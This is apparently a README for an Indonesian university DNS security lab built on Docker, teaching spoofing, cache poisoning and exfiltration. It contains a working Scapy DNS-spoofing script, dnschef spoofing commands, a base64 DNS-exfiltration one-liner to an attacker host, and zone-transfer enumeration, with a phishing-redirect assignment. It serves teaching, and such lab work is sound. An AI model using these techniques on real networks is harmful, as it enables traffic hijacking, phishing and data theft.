# 🌐 Pertemuan 7: DNS Security Lab

Lab environment untuk praktik DNS cache poisoning, DNS spoofing, DNS exfiltration, dan multi-server DNS attacks.

---

## 🚀 Quick Start

### Prerequisites
- Docker dan Docker Compose terinstall
- 4GB RAM available
- ~2GB disk space

### Jalankan Lab
```bash
# Dari folder Pertemuan7/
docker-compose up -d

# Verifikasi (should show 6 containers)
docker-compose ps

# Akses attacker container
docker-compose exec attacker-dns bash
```

### Cleanup
```bash
docker-compose down
```

---

## 📋 Lab Structure

```
Pertemuan7/
├── docker-compose.yml      # Lab configuration
├── README.md              # This file
├── captures/              # Untuk DNS packet captures
├── scripts/               # Untuk dnschef, Python spoofing scripts
└── configs/               # Untuk BIND9 configuration
```

---

## 🐳 Container Services

| Container | IP | Port | Role |
|-----------|----|----|------|
| attacker-dns | 192.168.70.2 | - | dnschef, Scapy |
| dns-resolver | 192.168.70.3 | 53 | BIND9 recursive resolver |
| dns-auth | 192.168.70.4 | 5353 | BIND9 authoritative NS |
| web-target | 192.168.70.5 | 80 | Phishing/redirection target |
| client-dns | 192.168.70.6 | - | Testing client |
| monitor-dns | 192.168.70.7 | - | Analysis (tcpdump) |

---

## 📖 Lab Workflow

### DNS Query Test

**Terminal 1: Monitor DNS Queries**
```bash
docker-compose exec monitor-dns bash
tcpdump -i eth0 -n port 53 -A
```

**Terminal 2: Client Queries**
```bash
docker-compose exec client-dns bash

# Query ke resolver
dig @192.168.70.3 google.com

# Query ke authoritative
dig @192.168.70.4 -p 5353 example.local
```

**Terminal 3: Attacker**
```bash
docker-compose exec attacker-dns bash

# Test dnschef
dnschef --help
```

---

## 🔧 DNS Attacks

### DNS Spoofing dengan Dnschef
```bash
docker-compose exec attacker-dns bash

# Spoof domain ke attacker IP
dnschef --fakeip 192.168.70.2 \
        --fakedomains example.com \
        --interface 192.168.70.2 \
        --nameserver 192.168.70.3 \
        -d
```

### Python Spoofing Script
```bash
docker-compose exec attacker-dns bash

python3 << 'EOF'
from scapy.all import *

def spoof_dns(pkt):
    if DNSQR in pkt and b"example.com" in pkt[DNSQR].qname:
        spoofed_pkt = IP(dst=pkt[IP].src, src="192.168.70.3") / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, 
                                  rdata="192.168.70.2"))
        send(spoofed_pkt, verbose=0)
        print(f"[+] Spoofed: {pkt[DNSQR].qname.decode()}")

print("[*] Starting DNS spoofer...")
sniff(filter="udp port 53", prn=spoof_dns, store=0)
EOF
```

### DNS Exfiltration
```bash
# Client side: mengirim data via DNS
DATA=$(echo "secret-data-12345" | base64)
nslookup $DATA.attacker.local 192.168.70.3

# Attacker side: capture data
tcpdump -i eth0 -n port 53 -A | grep attacker.local
```

---

## 📊 Monitoring & Analysis

### Capture DNS Traffic
```bash
docker-compose exec monitor-dns bash

# Capture ke file
tcpdump -i eth0 -n port 53 -w dns.pcap

# Real-time analysis
tcpdump -i eth0 -n port 53 -A
```

### Analyze Queries
```bash
# Show DNS queries
tcpdump -i eth0 -n 'udp port 53' | grep DNS

# Show specific domain
tcpdump -i eth0 -n 'udp port 53' | grep "example.com"
```

### Query Types
```bash
# A record (IPv4)
dig @192.168.70.3 example.com A

# AAAA record (IPv6)
dig @192.168.70.3 example.com AAAA

# MX record (Mail)
dig @192.168.70.3 example.com MX

# NS record (Nameserver)
dig @192.168.70.3 example.com NS

# Zone transfer (if allowed)
dig @192.168.70.4 -p 5353 example.local AXFR
```

---

## 🔧 Advanced Scenarios

### Cache Poisoning
```bash
# Attacker sends fake DNS response
# Tujuan: inject fake IP ke resolver cache
# Client queries → resolver checks cache → returns fake IP

# Contoh: attacker.local → 192.168.70.2
```

### Zone Transfer (DNS Enumeration)
```bash
# Check if zone transfer allowed
dig @192.168.70.4 -p 5353 example.local AXFR

# If allowed, dapat all DNS records
```

### DNSSEC Validation
```bash
# Check if DNSSEC active
dig @192.168.70.3 example.com +dnssec

# Can be bypassed in this lab (not implemented)
```

---

## 🔧 Troubleshooting

**DNS queries timeout:**
```bash
# Check resolver running
docker-compose logs dns-resolver

# Verify network
docker network inspect <network>

# Test directly
docker-compose exec dns-resolver bash
dig google.com
```

**Dnschef not working:**
```bash
docker-compose exec attacker-dns bash
apt update && apt install -y dnschef
dnschef --version
```

**Client can't resolve:**
```bash
# Edit /etc/resolv.conf di client
docker-compose exec client-dns bash
echo "nameserver 192.168.70.3" > /etc/resolv.conf

# Test lagi
nslookup example.com 192.168.70.3
```

**Port 53 already in use:**
```bash
# Gunakan port berbeda di docker-compose.yml
# Atau stop service yang menggunakan port 53
sudo lsof -i :53
```

---

## 📝 Lab Assignment

Ikuti hands-on di `Pertemuan7.md` section 5+:

1. Setup Docker lab (6 containers)
2. Test basic DNS queries
3. Setup DNS spoofing dengan dnschef
4. Observe poisoning dengan tcpdump
5. Redirect user ke phishing page
6. Practice DNS exfiltration
7. Analyze PCAP files

---

## 💾 Saving Results

```bash
# Backup captures
cp captures/* ~/backups/

# Backup scripts
cp scripts/* ~/backups/

# Export logs
docker-compose logs > ~/backups/dns-lab.log

# Save analysis
docker-compose exec monitor-dns tcpdump -r dns.pcap > analysis.txt
```

---

## 🎓 Learning Outcomes

Setelah lab ini, Anda akan memahami:
- ✅ DNS resolution process lengkap
- ✅ DNS cache dan TTL
- ✅ DNS spoofing mechanisms
- ✅ Cache poisoning attacks
- ✅ DNS exfiltration untuk data stealing
- ✅ Zone transfer vulnerabilities
- ✅ DNSSEC (basic concepts)
- ✅ DNS-over-HTTPS (DoH) alternative

---

## 📚 DNS Record Types

| Type | Fungsi | Example |
|------|--------|---------|
| A | IPv4 address | example.com → 1.2.3.4 |
| AAAA | IPv6 address | example.com → :: |
| CNAME | Alias | www.example.com → example.com |
| MX | Mail server | example.com → mail.example.com |
| NS | Nameserver | example.com → ns1.example.com |
| TXT | Text record | Untuk verification, SPF, DKIM |
| SOA | Start of Authority | Zone information |
| PTR | Reverse DNS | 1.2.3.4 → example.com |

---

**Tips:**
- Gunakan tcpdump untuk visualisasi DNS queries
- Dokumentasikan cache timing
- Test query variations (A, AAAA, MX, NS)
- Analyze response times before/after poisoning
- Backup PCAP untuk Wireshark analysis

**Performance:**
- First query: ~100-200ms (resolver lookups)
- Cached query: ~1-2ms
- With spoofing: instant redirect

**Next:** Baca `Pertemuan7.md` untuk teori lengkap dan advanced DNS scenarios.
